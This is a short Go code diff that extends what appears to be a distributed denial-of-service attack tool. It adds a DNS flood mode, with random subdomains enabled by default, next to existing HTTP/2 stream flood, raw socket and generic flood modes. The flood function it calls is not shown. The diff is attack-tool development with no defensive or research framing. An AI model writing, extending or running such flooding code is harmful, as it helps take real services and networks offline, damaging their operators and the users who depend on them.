@@ -32,6 +32,14 @@ func New(config DDoSConfig) *DDoSAttack {
 		config.MaxStreamsPerConn = 1000 // Default HTTP/2 streams per connection (increased from 100)
 	}
 
+	// Set DNS defaults
+	if config.AttackMode == ModeDNS {
+		if config.DNSRandomSubdomains == false && len(config.DNSQueryTypes) == 0 {
+			// Only set defaults if not explicitly configured
+			config.DNSRandomSubdomains = true
+		}
+	}
+
 	// Set default efficiency features (all enabled by default)
 	// Only set defaults if all are false (zero values), meaning they weren't set
 	// This allows explicit false values from menu configuration to be respected
@@ -127,6 +135,8 @@ func (d *DDoSAttack) Start(ctx context.Context) error {
 		d.startHTTP2StreamFlood()
 	case ModeRaw:
 		d.startRawSocketAttack()
+	case ModeDNS:
+		d.startDNSFloodAttack()
 	default:
 		// Default to flood if unknown mode
 		d.startFloodAttack()
